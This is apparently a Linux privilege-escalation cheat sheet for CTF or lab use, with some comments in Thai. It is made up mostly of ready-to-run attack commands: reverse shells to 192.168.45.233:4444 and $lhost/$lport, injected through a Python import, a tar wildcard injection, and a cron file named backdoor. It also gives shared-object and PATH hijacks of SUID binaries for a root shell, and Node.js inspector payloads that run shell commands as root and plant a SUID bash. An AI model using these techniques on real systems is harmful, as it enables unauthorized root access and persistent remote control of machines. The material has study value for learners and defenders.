...
# Edit import function with write 
import os;os.system("bash -c 'bash -i >& /dev/tcp/192.168.45.233/4444 0>&1'")
```
---
...
### Shared Object Hacking

```Bash
# Looking we have any write privileges on directory
ls -la $load-directory

# Craft malicious script, compile and run SUID binary.
cat > /tmp/evil.c << 'EOF'
#include <stdlib.h>
...
gcc -fPIC -shared -o /usr/local/lib/monitor/utils.so /tmp/evil.c
...
```Bash
# SUID in /usr/local/bin/backup have this abuse script
system("tar -czf /backup/out.tar.gz /data");

# สร้าง fake tar ใน /tmp
echo '/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar

# เพิ่ม /tmp เข้า PATH ก่อน /bin
export PATH=/tmp:$PATH

# รัน binary
/usr/local/bin/backup
# → เรียก /tmp/tar แทน /bin/tar → root shell
```
...
### PATH Manipulation If cron runs script without absolute path
...
### Wildcard Injection If cron runs `tar`, `chown`, `chmod` with wildcard `*`

```shell
# Example: root runs -> tar czf backup.tar.gz /tmp/backup/*
echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" > /tmp/backup/shell.sh
echo "" > "/tmp/backup/--checkpoint=1"
echo "" > "/tmp/backup/--checkpoint-action=exec=bash shell.sh"

# ตอนรันจะออกาเป็น
tar -czf out.tar.gz --checkpoint=1 --checkpoint-action=exec=bash shell.sh /tmp/backup/...
```

### Writable Cron Directory

```shell
# Check if cron.d or cron.* directories are writable
ls -la /etc/cron.d/
# If writable, drop a new cron file
echo "* * * * * root bash -i >& /dev/tcp/$lhost/$lport 0>&1" > /etc/cron.d/backdoor
```

### Monitor Cron Jobs (ไม่รู้ว่ามี cron อะไรรันอยู่)
...
### Relative Path in Cron Script

```shell
# ถ้า script ใน cron ใช้ relative path เช่น  ->  cd /opt && python3 monitor.py
# และ monitor.py import library ที่ writable
echo 'import os; os.system("bash -i >& /dev/tcp/$lhost/$lport 0>&1")' > /opt/library.py
```

### Node.js Inspector (Privileged --inspect Port)

Enumeration

```shell
# หา root process ที่รัน --inspect
ps aux | grep node
ps -eo pid,user,args | grep inspect
ss -tlnp | grep 9229
```
...
```shell
ssh -f -N -L 9230:127.0.0.1:9229 user@<target_ip>
curl http://localhost:9230/json  # เอา WebSocket ID
```
...
```shell
npm install -g wscat
wscat -c "ws://localhost:9230/<id>"
```

```json
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()"}}
```

SUID Bash

```json
{"id":2,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/bash && chmod +s /tmp/bash')"}}
```
...
```shell
# require is not defined → ใช้ process.mainModule.require()
# Address already in use → เปลี่ยน local port -L 9231:127.0.0.1:9229
```
---
